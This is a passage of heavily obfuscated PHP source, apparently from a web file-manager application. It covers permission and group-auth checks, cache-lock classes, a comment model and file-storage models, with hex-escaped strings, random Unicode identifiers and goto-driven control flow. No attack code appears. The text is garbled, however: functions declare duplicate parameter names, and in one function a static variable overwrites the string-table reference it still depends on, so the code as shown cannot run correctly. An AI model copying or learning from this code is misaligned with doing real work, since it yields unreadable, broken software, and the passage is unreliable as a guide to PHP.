$a = array(); foreach ($bǑ[$c] as $EŎʟ) { $a[] = $BԶՎˏ[$EŎʟ]; } $e˴[$B] = array_merge($a, $eʍ); } $C = array_values(array_unique($C)); goto EǈݸƟ; Fȟұ: } private function makeSourceAuth($CɌ, $D襃, $e = false) { goto aѦ; C: $D = $CɌ[$bߥ[404]] == SourceModel::TYPE_GROUP; $f񃌤 = $D ? $this->groupRootAuth($E, $e) : !1; if ($f񃌤 && Model($bߥ[1862])->authCheckAction($f񃌤[$bߥ[406]], $bߥ[1715])) { return $this->groupAuthInfo($f񃌤, $E); } goto bﭤŧ; c: if (!$fϐ) { $A = Model($bߥ[486])->getInfo($E); $d = explode($bߥ[47], trim($A[$bߥ[487]], $bߥ[47])); $d = array_reverse($d); foreach ($d as $FŮ֒) { if ($FŮ֒ == $bߥ[191] || $FŮ֒ == $Aѣ) { continue; } $eŔ = $this->groupRootAuth($FŮ֒, $e); if (!$eŔ) { continue; } $fϐ = $this->groupAuthInfo($eŔ, $FŮ֒); break; } } if (!$fϐ || $fϐ[$bߥ[407]] <= 0) { $aӊ = $this->authDeepCheck($CɌ[$bߥ[395]], $e); if ($aӊ) { $fϐ = $aӊ; } } return $fϐ; goto DҜ; bﭤŧ: $D鋫 = Model($bߥ[1205])->parentLevelArray($CɌ[$bߥ[487]]); $D鋫 = array_merge(array($CɌ[$bߥ[395]]), array_reverse($D鋫)); $fϐ = !1; goto CӃˇ; aѦ: $bߥ =& $_SERVER[̉]; $Aѣ = $bߥ[87]; $E = $CɌ[$bߥ[484]]; goto C; CӃˇ: foreach ($D鋫 as $cʻ) { if (!isset($D襃[$cʻ])) { continue; } $BɃ = $this->authMake($D襃[$cʻ], $e); if ($BɃ[$bߥ[446]]) { $fϐ = $BɃ; break; } } if (!$D) { return $fϐ; } if (!$fϐ && $f񃌤) { $fϐ = $this->groupAuthInfo($f񃌤, $E); } goto c; DҜ: } private function userIsRoot($d = false) { $f =& $_SERVER[̉]; if (!$d && _get($GLOBALS, $f[485])) { return !0; } $d詙 = Model($f[506])->getInfo($d); $D˱ = Model($f[1883])->listData($d詙[$f[1414]]); if ($D˱ && $D˱[$f[1284]][$f[1884]] == 1) { return !0; } return !1; } private function sourceAuthInfo($D) { goto BӖ; Cׯ: $c = $f->_listAppendPath($c); $fҒ = $c[0]; $C = $fҒ[$eګޜ[495]]; goto EŚ; BӖ: $eګޜ =& $_SERVER[̉]; $f = Model($eګޜ[1205]); $fҒ = $f->sourceInfo($D); goto e렝쨑; e렝쨑: if (!$fҒ) { return !1; } $f->groupPathDisplay($fҒ); $c = array($fҒ); goto Cׯ; EŚ: if (isset($fҒ[$eګޜ[492]])) { $b˝ = explode($eګޜ[8], trim($fҒ[$eګޜ[495]], $eګޜ[8])); array_shift($b˝); $C = $fҒ[$eګޜ[490]] . $eګޜ[1885] . implode($eګޜ[8], $b˝); } return array($eګޜ[413] => $fҒ[$eګޜ[28]], $eګޜ[76] => KodIO::make($fҒ[$eګޜ[395]]), $eګޜ[1886] => $C); goto d׵͉; d׵͉: } private function groupAuthInfo($c, $Dˏ) { $d =& $_SERVER[̉]; $EˍƟ = Model($d[486])->getInfo($Dˏ); return array($d[1887] => intval($c[$d[406]]), $d[1871] => $c, $d[1888] => LNG($d[1889]), $d[1880] => array($d[413] => $EˍƟ[$d[28]], $d[76] => KodIO::make($EˍƟ[$d[85]][$d[395]]), $d[1886] => $EˍƟ[$d[491]])); } protected function groupRootAuth($EҞ, $B쭇 = false) { goto f띎; f띎: $E =& $_SERVER[̉]; $B쭇 = $B쭇 ? $B쭇 : USER_ID; $E׷ = $B쭇 . $E[1890] . $EҞ; goto fڇ; fڇ: static $E = array(); if (isset($E[$E׷])) { return $E[$E׷]; } $E = Model($E[486])->getInfo($EҞ); goto B; d겐: $E[$E׷] = $aћ ? $aћ : $Fۺ; return $E[$E׷]; goto b; B: $f = $this->userGroupList($B쭇); $Fۺ = isset($f[$EҞ]) ? $f[$EҞ][$E[406]] : !1; if ($Fۺ && Model($E[1862])->authCheckAction($Fۺ[$E[406]], $E[1715])) { $E[$E׷] = $Fۺ; return $Fۺ; } goto aԜӣ; aԜӣ: $A뱉 = $this->sourceAuthSelect($E[$E[85]][$E[395]]); $fó = $A뱉 ? $this->authMake($A뱉, $B쭇) : !1; $aћ = $fó ? $fó[$E[446]] : !1; goto d겐; b: } public function authOwnerApply($e޽) { goto A䉆; fϗ: $Bғ = Model($Dշ[1205])->parentLevelArray($e޽[$Dշ[487]]); $Bғ = array_merge(array($e޽[$Dշ[395]]), array_reverse($Bғ)); $Cք = $this->sourceAuthSelect($Bғ); goto C; b閂: if (count($aꊟ) == 0) { $aꊟ = $this->authFolderOwnerGroup($e޽[$Dշ[484]]); } $aꊟ = array_unique($aꊟ); if (AuthModel::authCheckRoot($e޽[$Dշ[406]][$Dշ[407]])) { $aꊟ[] = USER_ID; } goto Aۮܞ; A䉆: $Dշ =& $_SERVER[̉]; if (empty($e޽[$Dշ[406]]) || isset($e޽[$Dշ[1891]]) && $e޽[$Dշ[1891]]) { return $e޽; } if (AuthModel::authCheckRoot($e޽[$Dշ[406]][$Dշ[407]])) { return $e޽; } goto fϗ; C: $dɍްۉ = array(); $aꊟ = array(); foreach ($Cք as $bگ => $Fќ) { $c = $this->authFolderOwnerUser($Fќ); $dɍްۉ[$bگ] = $c; $aꊟ = array_merge($aꊟ, $c[$Dշ[562]]); if ($c[$Dշ[1892]]) { break; } } goto b閂; Aۮܞ: $e޽[$Dշ[406]][$Dշ[1893]] = Model($Dշ[502])->userListInfo($aꊟ); return $e޽; goto E; E: } private function authFolderOwnerGroup($Fʾ) { $Aׅ =& $_SERVER[̉]; $Aظ = Model($Aׅ[1776])->where(array($Aׅ[1695] => $Fʾ))->select(); $Cܻ = array(); if (!$Aظ) { return $Cܻ; } foreach ($Aظ as $dɍ) { $FވŤ = $this->authInfo($dɍ); if (AuthModel::authCheckRoot($FވŤ[$Aׅ[406]])) { $Cܻ[] = $dɍ[$Aׅ[1531]]; } } return $Cܻ; } private function authFolderOwnerUser($e) { $dÇ =& $_SERVER[̉]; $eׄ = array(); $f = !1; foreach ($e as $Bس) { $E䮲 = $this->authInfo($Bس); if ($Bس[$dÇ[484]] == $dÇ[191]) { $f = !0; } if ($Bس[$dÇ[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($E䮲[$dÇ[406]])) { $eׄ[] = $Bس[$dÇ[484]]; } } } return array($dÇ[562] => $eׄ, $dÇ[1892] => $f); } public function authMake($F, $cฎ = false) { $cނ =& $_SERVER[̉]; $C㔧 = $this->authArrayCheck($F, $cฎ); if ($C㔧[$cނ[1894]]) { $C㔧[$cނ[1894]] = $this->sourceAuthInfo($C㔧[$cނ[1894]]); } return $C㔧; } public function authArrayCheck($A, $e = false) { goto dЌ; Fޏ: foreach ($A as $CԲ) { $b܃ = $this->authInfo($CԲ); if (!$b܃) { continue; } $bӣڶ = $CԲ[$F[484]]; $D = intval($b܃[$F[406]]); if ($CԲ[$F[404]] == SourceModel::TYPE_USER && $bӣڶ == $e) { $B = !0; $Dƃ = $b܃; $B䦒 = $D; } else { if ($CԲ[$F[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($bӣڶ, $e)) { $E = !0; $f԰ = $this->groupStepToUserGroup($bӣڶ, $e); if ($f԰ < $e) { $e = $f԰; $Bľ = $D; $C = $b܃; $Cϒ = $bӣڶ; } if ($f԰ == $e && $D >= $Bľ) { $Bľ = $D; $C = $b܃; $Cϒ = $bӣڶ; } } else { if ($bӣڶ == $F[191]) { $FЇ = !0; $bʑܸ = $b܃; $E = $D; } } } } if ($B) { $B׿ = $B䦒; $b܃ = $Dƃ; $AϾ = LNG($F[1895]); } else { if ($E) { $B׿ = $Bľ; $b܃ = $C; $f샖 = Model($F[486])->getInfo($Cϒ); $AϾ = $F[160] . $f샖[$F[491]] . $F[1896] . LNG($F[1897]); } else { if ($FЇ) { $B׿ = $E; $b܃ = $bʑܸ; $AϾ = LNG($F[1868]); } else { $B׿ = 0; $b܃ = !1; $AϾ = $F[33]; } } } $Dʛ = array($F[1887] => intval($B׿), $F[1871] => $b܃, $F[1888] => $AϾ, $F[1880] => $CԲ[$F[395]]); goto eڢҠ; E: $E = 0; $Bľ = 0; $C = 0; goto Eד; f: $B = 0; $B䦒 = 0; $Dƃ = 0; goto E; Eד: $e = 1000; $Cϒ = 0; $FЇ = 0; goto FٍΪ; dЌ: $F =& $_SERVER[̉]; if (!$A) { return array($F[407] => 0, $F[446] => !1); } $e = $e ? $e : USER_ID; goto f; eڢҠ: return $Dʛ; goto Aܥ; FٍΪ: $E = 0; $bʑܸ = 0; $CԲ = array($F[395] => 0); goto Fޏ; Aܥ: } private function groupContainUser($e, $fȋ = false) { return in_array($e, $this->userGroupParents($fȋ)); } private function groupStepToUserGroup($e, $bۆ = false) { goto E؃; Cғ: return $F׶; goto f; E؃: $Aꋚ =& $_SERVER[̉]; $C̏ = $this->userGroupList($bۆ); $F׶ = 1000; goto Fڍ; Fڍ: $fк = $GLOBALS[$Aꋚ[6]][$Aꋚ[88]][$Aꋚ[1787]] == 1; $a朓 = $fк ? 3 : 2; foreach ($C̏ as $aկ) { if ($aկ[$Aꋚ[1695]] == $e) { return 0; } $Eڽ = explode($Aꋚ[47], trim($aկ[$Aꋚ[487]], $Aꋚ[47])); if ($Eڽ[0] == $Aꋚ[191] && count($Eڽ) > $a朓) { $Fǅ = array_reverse(array_slice($Eڽ, $a朓)); $dյ = array_search($e, $Fǅ); if ($dյ !== !1 && $dյ + 1 <= $F׶) { $F׶ = $dյ + 1; } } } goto Cғ; f: } private function userGroupList($e񣘇 = false) { $EʙϹ =& $_SERVER[̉]; static $C߄տ = array(); if (isset($C߄տ[$e񣘇])) { return $C߄տ[$e񣘇]; } $a買ճ = Model($EʙϹ[506])->getInfo($e񣘇); $C߄տ[$e񣘇] = array_to_keyvalue($a買ճ[$EʙϹ[1869]], $EʙϹ[1695]); return $C߄տ[$e񣘇]; } public function userGroupParents($fס) { goto e䔂; a䖍Ⱦ: $Aܙϲ˂[$fס] = array_unique($C錈); return $Aܙϲ˂[$fס]; goto Cٻ; e䔂: $Eު =& $_SERVER[̉]; static $Aܙϲ˂ = array(); $fס = $fס ? $fס : USER_ID; goto eڐʈ; eڐʈ: if (isset($Aܙϲ˂[$fס])) { return $Aܙϲ˂[$fס]; } $CԨ׋ = $this->userGroupList($fס); $C錈 = array(); goto a; a: $c畃 = $GLOBALS[$Eު[6]][$Eު[88]][$Eު[1787]] == 1; $E = $c畃 ? 3 : 2; foreach ($CԨ׋ as $A) { $c٥ = array($A[$Eު[1695]]); $bᮆ = explode($Eު[47], trim($A[$Eު[487]], $Eު[47])); if ($bᮆ[0] == $Eު[191] && count($bᮆ) > $E) { $b׊ = array_slice($bᮆ, $E); $c٥ = array_merge($c٥, array_reverse($b׊)); } $C錈 = array_merge($C錈, $c٥); } goto a䖍Ⱦ; Cٻ: } public function authTargetInfoMake($aĔ) { goto c̩; a鑇龳: foreach ($aĔ as $f) { if ($f[$D٠ލ[404]] == SourceModel::TYPE_USER) { $E[] = intval($f[$D٠ލ[484]]); } else { if ($f[$D٠ލ[404]] == SourceModel::TYPE_GROUP) { $a[] = intval($f[$D٠ލ[484]]); } } } if ($E) { $E = Model($D٠ލ[502])->userListInfo($E); } if ($a) { $EȮ = array($D٠ލ[1773] => array($D٠ލ[411], $a)); $a = Model($D٠ލ[486])->field($D٠ލ[1898])->where($EȮ)->select(); $a = array_to_keyvalue($a, $D٠ލ[1695]); } goto fи; c̩: $D٠ލ =& $_SERVER[̉]; $E = array(); $a = array(); goto a鑇龳; fи: return array($D٠ލ[1899] => $E, $D٠ލ[1900] => $a); goto DЋ; DЋ: } public function authInfo($A݊) { $fÉɕ =& $_SERVER[̉]; if ($A݊[$fÉɕ[1790]]) { $Fگ = Model($fÉɕ[1862])->listData($A݊[$fÉɕ[1790]]); if (!$Fگ) { return !1; $D = Model($fÉɕ[1862])->listData(); $BܔՙѦ = array_filter_by_field($D, $fÉɕ[406], $fÉɕ[191]); return $BܔՙѦ; } $e򤩜 = array_field_key($Fگ, array($fÉɕ[393], $fÉɕ[28], $fÉɕ[406], $fÉɕ[1716], $fÉɕ[1718])); $e򤩜[$fÉɕ[1901]] = $A݊; return $e򤩜; } else { return array($fÉɕ[412] => 0, $fÉɕ[1701] => $A݊[$fÉɕ[1844]], $fÉɕ[413] => $fÉɕ[33], $fÉɕ[1716] => $fÉɕ[1902]); } } } goto bۃ; E󽅎: define($_SERVER[̉][237], 2); define($_SERVER[̉][238], 3); define($_SERVER[̉][239], 1); goto Fܿ֎; b٘: class CacheLockRedis { public function lock($f֛ɂ, $Aܥî = 10) { $eݶ = Cache::init(); $e⤈ڶ = microtime(!0) + $Aܥî; while (microtime(!0) < $e⤈ڶ) { $E = $eݶ->get($f֛ɂ); if (!$E) { $D㊊ = $eݶ->setLock($f֛ɂ, $e⤈ڶ, $Aܥî); if ($D㊊) { return !0; } } else { if ($E < microtime(!0)) { $eݶ->set($f֛ɂ, $e⤈ڶ, $Aܥî * 2); if ($eݶ->get($f֛ɂ) === $E) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C) { return Cache::init()->get($C); } public function unlock($D⺰) { return Cache::init()->remove($D⺰); } } class CacheLockMemcached { public function lock($F, $eӚ = 0) { $a椯 = Cache::init(); $aҦ = microtime(!0) + $eӚ; while (microtime(!0) < $aҦ) { $Cٵ = $a椯->get($F); if (!$Cٵ || $Cٵ < microtime(!0)) { $a֏ = $a椯->handle->add($F, $aҦ, $eӚ); if ($a֏) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($f) { return Cache::init()->get($f); } public function unlock($DЇΦ) { return Cache::init()->remove($DЇΦ); } } class CacheLockDatabase { public function lock($cӒ, $C澃 = 0) { $aоʑ = Model($_SERVER[̉][797]); $B鱧 = microtime(!0) + $C澃; while (microtime(!0) < $B鱧) { $EƤ® = $aоʑ->get($cӒ); if (!$EƤ® || $EƤ® < microtime(!0)) { $Fق = $aоʑ->set($cӒ, $B鱧); if ($Fق) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E) { return Model($_SERVER[̉][797])->get($E); } public function unlock($aٴ) { Model($_SERVER[̉][797])->remove($aٴ); } } goto fĄ; e긜: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\156\x74"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\155\x65" => "\143\157\x6d\155\145\156\164\x5f\155\145\x74\x61", "\155\145\x74\x61\x46\x69\x65\x6c\x64" => "\x63\157\155\x6d\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($B) { $Eۢ̎ =& $_SERVER[̉]; if ($B[$Eۢ̎[1723]]) { $bӏ = $this->where(array($Eۢ̎[1724] => $B[$Eۢ̎[1723]]))->find(); if (!$bӏ || $bӏ[$Eۢ̎[404]] != $B[$Eۢ̎[404]] || $bӏ[$Eۢ̎[484]] != $B[$Eۢ̎[484]]) { return !1; } $this->where(array($Eۢ̎[1724] => $B[$Eۢ̎[1723]]))->setAdd($Eۢ̎[1725], 1); } $B[$Eۢ̎[1726]] = 0; $B[$Eۢ̎[1725]] = 0; $B[$Eۢ̎[713]] = 1; return $this->add($B); } public function commentCount($A˼ͷ, $b) { goto B; Aӊ凈: return array_to_keyvalue($E, $BЗ[484], $BЗ[480]); goto d; cɈ×Ϡ: $b = array($BЗ[484], $BЗ[1727] => $BЗ[480]); $A = array($BЗ[484] => array($BЗ[7], $A˼ͷ), $BЗ[404] => $b); $E = $this->field($b)->where($A)->group($BЗ[484])->select(); goto Aӊ凈; B: $BЗ =& $_SERVER[̉]; if (!$A˼ͷ) { return array(); } if (is_string($A˼ͷ) || is_int($A˼ͷ)) { $A˼ͷ = array($A˼ͷ); } goto cɈ×Ϡ; d: } public function remove($F֯) { $c裟桫 =& $_SERVER[̉]; $BǏ = array($c裟桫[1724] => $F֯); $f = $this->where($BǏ)->find(); if ($f[$c裟桫[1723]]) { $this->where(array($c裟桫[1724] => $f[$c裟桫[1723]]))->setAdd($c裟桫[1725], -1); } return $this->where($BǏ)->delete(); } public function edit($E, $a򂨒) { $dƙ =& $_SERVER[̉]; $c钴 = array($dƙ[1724] => $E); return $this->where($c钴)->save(array($dƙ[1728] => $a򂨒)); } public function prasise($a) { $e˗ =& $_SERVER[̉]; $F񷓉 = Model($e˗[1729]); $E݆ = array($e˗[1724] => $a, $e˗[1523] => USER_ID); $fĹ = $F񷓉->where($E݆)->find(); if (!$fĹ) { $F񷓉->add($E݆); $Fݵ = $this->where(array($e˗[1724] => $a))->setAdd($e˗[1726], 1); } else { $F񷓉->where($E݆)->delete(); $Fݵ = $this->where(array($e˗[1724] => $a))->setAdd($e˗[1726], -1); } return $Fݵ; } public function targetInfo($eӰ, $dژ) { goto eޒѲ; Fߞ: return $a; goto bΓ; eޒѲ: $Cƙڛ =& $_SERVER[̉]; $Eᕮ = array($Cƙڛ[549] => $eӰ, $Cƙڛ[550] => $dژ); $cťӑ = $this->where($Eᕮ)->count(); goto B; B: $dӓ = "\x52\x49\107\110\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\164\x5f\x70\162\141\151\163\x65\x20\x73\x74\x61\x72\x20\157\156\40\143\157\155\155\145\x6e\x74\56\x63\157\155\155\145\156\164\111\x44\40\x3d\x20\163\x74\x61\x72\56\x63\x6f\x6d\155\145\156\164\111\x44"; $Fޚ峋 = $this->alias($Cƙڛ[352])->where($Eᕮ)->join($dӓ, $Cƙڛ[1730])->count(); $a = array($Cƙڛ[1731] => $cťӑ, $Cƙڛ[1732] => $Fޚ峋); goto Fߞ; bΓ: } public function listData($cǷ) { $a뵧 =& $_SERVER[̉]; if (isset($cǷ[$a뵧[1733]])) { if ($cǷ[$a뵧[1733]]) { $cǷ[$a뵧[1734]] = array($a뵧[970], intval($cǷ[$a뵧[1733]])); } unset($cǷ[$a뵧[1733]]); } if (isset($cǷ[$a뵧[1735]])) { if ($cǷ[$a뵧[1735]]) { $cǷ[$a뵧[1734]] = array($a뵧[967], intval($cǷ[$a뵧[1735]])); } unset($cǷ[$a뵧[1735]]); } return $this->_listData($cǷ); } private function _listData($AϹ) { $F̠ڋ =& $_SERVER[̉]; $c = $this->where($AϹ)->_makeOrder()->selectPage(100); $this->_listAppendParent($c[$F̠ڋ[367]]); $this->_listAppendUser($c[$F̠ڋ[367]]); $this->_listAppendMeta($c[$F̠ڋ[367]]); return $c; } private function _makeOrder() { $Fܑ =& $_SERVER[̉]; $c = array($Fܑ[1726], $Fܑ[1725], $Fܑ[194]); $E𐇱 = Input::get($Fܑ[435], $Fܑ[7], $Fܑ[416], $c); $CӪ = Input::get($Fܑ[436], $Fܑ[7], $Fܑ[1525], array($Fܑ[1736], $Fܑ[431])); $cȜ = $E𐇱 . $Fܑ[50] . $CӪ; return $this->order($cȜ); } private function _listAppendParent(&$f꠹) { goto Eշ; Eշ: $F =& $_SERVER[̉]; $C = array_unique(array_to_keyvalue($f꠹, $F[33], $F[1723])); $C = array_remove_value($C, $F[191]); goto D¢; D¢: if (!$C) { return; } $B = $this->where(array($F[1724] => array($F[7], $C)))->select(); $B = array_to_keyvalue($B, $F[1734]); goto Aӂ; Aӂ: foreach ($f꠹ as &$eݔۖ) { if (isset($B[$eݔۖ[$F[1723]]])) { $eݔۖ[$F[1737]] = $B[$eݔۖ[$F[1723]]]; } } unset($eݔۖ); goto Cת; Cת: } private function _listAppendUser(&$Dŷ) { goto a; Câ: if (count($bՑ) == 0) { return; } foreach ($Dŷ as $B¢) { if (isset($B¢[$d[1737]])) { $bՑ[] = $B¢[$d[1737]][$d[1531]]; } } $bߦˠ = Model($d[506])->userListInfo($bՑ); goto c; a: $d =& $_SERVER[̉]; $bՑ = array_unique(array_to_keyvalue($Dŷ, $d[33], $d[1531])); $bՑ = array_remove_value($bՑ, $d[191]); goto Câ; c: foreach ($Dŷ as &$B¢) { $B¢[$d[562]] = $bߦˠ[$B¢[$d[1531]]]; if (isset($B¢[$d[1737]])) { $B¢[$d[1737]][$d[562]] = $bߦˠ[$B¢[$d[1737]][$d[1531]]]; } } unset($B¢); goto Bɗ; Bɗ: } private function _listAppendMeta(&$C) { goto E̘; E̘: $f֦ =& $_SERVER[̉]; $d挟 = array_unique(array_to_keyvalue($C, $f֦[33], $f֦[1734])); $d挟 = array_remove_value($d挟, $f֦[191]); goto F߅; BҊ׋: if (!$E˘) { return !1; } foreach ($C as &$A) { $A[$f֦[445]] = $E˘[$A[$f֦[1734]]]; if (isset($A[$f֦[1737]])) { $A[$f֦[1737]][$f֦[445]] = $E˘[$A[$f֦[1737]][$f֦[1734]]]; } } unset($A); goto CҮ; F߅: if (!$d挟) { return; } foreach ($C as $A) { if (isset($A[$f֦[1737]])) { $d挟[] = $A[$f֦[1737]][$f֦[1734]]; } } $E˘ = $this->metaList($d挟); goto BҊ׋; CҮ: } private function metaList($f܌ܮֿ) { goto D녌; Aˍ: $a׍ = Model($FłԻ[1738])->where($eѻ)->select(); $a׍ = array_to_keyvalue_group($a׍, $FłԻ[1734]); foreach ($a׍ as $d׵ => $CĮ) { $b = array(); foreach ($CĮ as $eڵ쩧) { $b[$eڵ쩧[$FłԻ[93]]] = $eڵ쩧[$FłԻ[372]]; } $a׍[$d׵] = $b; } goto dףԤ։; dףԤ։: return $a׍ ? $a׍ : array(); goto bޖ; D녌: $FłԻ =& $_SERVER[̉]; if (!$f܌ܮֿ) { return array(); } $eѻ = array($FłԻ[1734] => array($FłԻ[7], $f܌ܮֿ)); goto Aˍ; bޖ: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\145\x5f\x63\x6f\x6e\164\x65\156\164\x73"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\x69\x6d\145", "\x74\151\155\x65", "\151\156\163\145\162\164", "\x66\165\x6e\143\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\155\x65" => "\x69\x6f\x5f\x66\151\154\145\137\x6d\145\164\x61", "\155\145\164\x61\106\151\x65\154\144" => "\146\x69\x6c\x65\111\104"); public function fileInfo($fͬ) { $Dؘ쉊 =& $_SERVER[̉]; static $Bݝޠ = array(); if (!isset($Bݝޠ[$fͬ])) { $b = $Dؘ쉊[1739]; $fξ = Model($Dؘ쉊[450])->field($b)->where(array($Dؘ쉊[448] => $fͬ))->find(); $Bݝޠ[$fͬ] = $fξ; } return $Bݝޠ[$fͬ]; } public function addFileByContent($Cɺع = '', $fˏᬲ = '') { goto a; d: if (file_exists($a܄뉡)) { @unlink($a܄뉡); } return $F; goto c׏; a: $fƥ =& $_SERVER[̉]; $C = TEMP_PATH . $fƥ[1740]; if (!is_dir($C)) { mk_dir($C); } goto bҍ; bҍ: $a܄뉡 = $C . $fƥ[1741] . rand_string(16); file_put_contents($a܄뉡, $Cɺع); $F = $this->addFile($a܄뉡, $fˏᬲ, !0); goto d; c׏: } public function createFileName($c鿕, $B = false, $AΌ = false) { goto A͎; cכ: $E果 = $E䩶->pathFather($Aؑܘ); static $F߬ = false; $Cש = $Dڍ[1742] . md5($E果); goto Aǧ; Aǧ: if (!$F߬ && !Cache::get($Cש)) { $F߬ = !0; $DƔ = IO::mkdir($E果); if (!IO::exist($DƔ . $Dڍ[764])) { IO::mkfile($DƔ . $Dڍ[764]); } Cache::set($Cש, 1, 3600 * 2); } return $Aؑܘ; goto A; A͎: $Dڍ =& $_SERVER[̉]; $E䩶 = IO::init($Dڍ[8]); $Aؑܘ = $this->makeFilePath($c鿕, $E䩶, $B, $AΌ); goto cכ; A: } public function makeFilePath($Cҧ֏, $C, $Dخۅ = false, $F벻 = false) { goto E; E: $fᤎ =& $_SERVER[̉]; $Dߛ = Model($fᤎ[733])->get($fᤎ[1743]); $a = KodIO::defaultIO() . date($fᤎ[1744]); goto Cב; f⌧: if (!$Cҧ֏) { $Dߛ = $fᤎ[1745]; } switch ($Dߛ) { case $fᤎ[1746]: $Bც = $Bც . $fᤎ[95] . $C->ext($Cҧ֏); if ($B == $fᤎ[1685]) { $Bც .= $fᤎ[1431]; } break; case $fᤎ[1747]: goto a; Bᗏ֡: if (IO::isTypeObject($Bც) && !IO::isUploadServer($Bც)) { if (IO::exist($Bც)) { return $Bც; } $f۾߭ = IO::setContent($Bც, $fᤎ[33]); if (!$f۾߭) { show_json($fᤎ[1750], !1); } } CacheLock::unlock($dľ߸); break; goto b; Cⰾ: CacheLock::lock($dľ߸); $Bც = $a . $Cҧ֏; if (IO::exist($a . $Cҧ֏)) { $Aڒ = substr($Cҧ֏, 0, strlen($Cҧ֏) - strlen($B)); $Aק = $F벻 ? substr($F벻, 0, 5) : ($Dخۅ ? substr($Dخۅ, 0, 5) : rand_string(5)); $Bც = $a . $Aڒ . $Aק . $fᤎ[95] . $B; } goto Bᗏ֡; B󂓤: $a = $fᤎ[1123] . $e㰂[$fᤎ[393]] . $fᤎ[402] . date($fᤎ[1748]) . $aǦǰ . $fᤎ[8]; if ($B == $fᤎ[1685]) { $Cҧ֏ .= $fᤎ[1431]; } $dľ߸ = $fᤎ[1749] . $a . $Cҧ֏; goto Cⰾ; a: $a = Model($fᤎ[733])->get($fᤎ[734]); $aǦǰ = substr(md5($fᤎ[735] . $a . date($fᤎ[711])), 0, 8); $e㰂 = KodIO::defaultDriver(); goto B󂓤; b: case $fᤎ[1745]: break; default: break; } return $Bც; goto eפ; Cב: $Bც = $a . rand_string(5) . short_id(100); $Cҧ֏ = str_replace($fᤎ[8], $fᤎ[71], KodIO::clear($Cҧ֏)); $B = $C->ext($Cҧ֏); goto f⌧; eפ: } public function addFileByRemote($d㍪, $F魗, $E = array()) { goto a; a: $c =& $_SERVER[̉]; if (!IO::exist($d㍪)) { return !1; } $eȢ냷 = $E[$c[170]] ? $E[$c[170]] : $c[33]; goto Bǅ; f: if ($Dϣ = $this->addFileCheckExist($aЍ[$c[171]], $aЍ[$c[170]], $aЍ[$c[78]])) { return $Dϣ; } return $this->addFileData($aЍ); goto bɎя; Bǅ: $D = IO::hashMd5($d㍪, $eȢ냷); $E = KodIO::defaultDriver(); $aЍ = array($c[548] => IO::size($d㍪), $c[1751] => 1, $c[413] => $F魗, $c[776] => $E[$c[393]], $c[414] => $d㍪, $c[1752] => $E[$c[171]] ? $E[$c[171]] : IO::hashSimple($d㍪), $c[1753] => $D ? $D : $eȢ냷); goto f; bɎя: } private function addFileData($fئ) { $D֬ =& $_SERVER[̉]; if (!$fئ) { return !1; } $fئ[$D֬[78]] = intval($fئ[$D֬[78]]); if (!$fئ[$D֬[78]] && strlen($fئ[$D֬[171]]) > 32) { $fئ[$D֬[78]] = intval(substr($fئ[$D֬[171]], 32)); } $fכӺ = $this->add($fئ); return $this->find($fכӺ); } public function addFile($Dܐ, $E✔, $cضϫ = false) { goto Fç; e԰: $a = $_SERVER[̉][1754] . $aޅ; CacheLock::lock($a); if ($a = $this->addFileCheckExist($a, $aޅ, $D)) { CacheLock::unlock($a); return $a; } goto D; Fç: $a = IO::hashSimple($Dܐ); $aޅ = IO::hashMd5($Dܐ); $D = IO::size($Dܐ); goto e԰; fқ: return $Bޣ; goto Aĵ; D: $F덦 = $this->addFileMake($Dܐ, $D, $a, $aޅ, $E✔, $cضϫ); $Bޣ = $this->addFileData($F덦); CacheLock::unlock($a); goto fқ; Aĵ: } public function addFileMake($C¨, $A, $a컉, $C赑Ĭ, $c닥, $A) { goto C抡݌; FƱ: $C޹ = get_path_this($Cݥ); if ($A) { $Fϑ = IO::move($C¨, $C谈띛, !1, $C޹); } else { $Fϑ = IO::copy($C¨, $C谈띛, !1, $C޹); } if (!$Fϑ) { return !1; } goto Bᄌ؝; C抡݌: $d˥ =& $_SERVER[̉]; $Cݥ = $this->createFileName($c닥, $a컉, $C赑Ĭ); $C谈띛 = get_path_father($Cݥ); goto FƱ; Bᄌ؝: $Dć = KodIO::defaultDriver(); $dؿĻ = array($d˥[548] => $A, $d˥[1751] => 1, $d˥[413] => $c닥, $d˥[776] => $Dć[$d˥[393]], $d˥[414] => $Cݥ, $d˥[1752] => $a컉, $d˥[1753] => $C赑Ĭ); return $dؿĻ; goto D; D: } public function addFileCheckExist($E, $D, $E) { $Fޢ =& $_SERVER[̉]; $bڊ،˔ = $this->findByHash($E, $D); if (!$bڊ،˔) { return !1; } $A = array($Fޢ[1751] => intval($bڊ،˔[$Fޢ[1755]]) + 1, $Fޢ[548] => $E); $this->where(array($Fޢ[448] => $bڊ،˔[$Fޢ[447]]))->save($A); return $bڊ،˔; } public function remove($C) { $this->linkCountChange($C, !1); $this->clearEmpty(); return !0; } public function linkAdd($A쫢) { $this->linkCountChange($A쫢, !0); } public function linkCountChange($Fݿ, $e) { goto Cꂶ; Cꂶ: $E㥨 =& $_SERVER[̉]; if (!$Fݿ) { return; } if (!is_array($Fݿ)) { $Fݿ = array($Fݿ); } goto Eծ; Eծ: $b䵌 = array(); foreach ($Fݿ as $f͝) { $f = $f͝ . $E㥨[33]; if (!$b䵌[$f]) { $b䵌[$f] = 0; } $b䵌[$f]++; } $E = array(); goto D; D: foreach ($b䵌 as $f͝ => $d䣊) { $f = $d䣊 . $E㥨[33]; if (!$E[$f]) { $E[$f] = array(); } $E[$f][] = $f͝; } foreach ($E as $d䣊 => $AǶˢ) { if 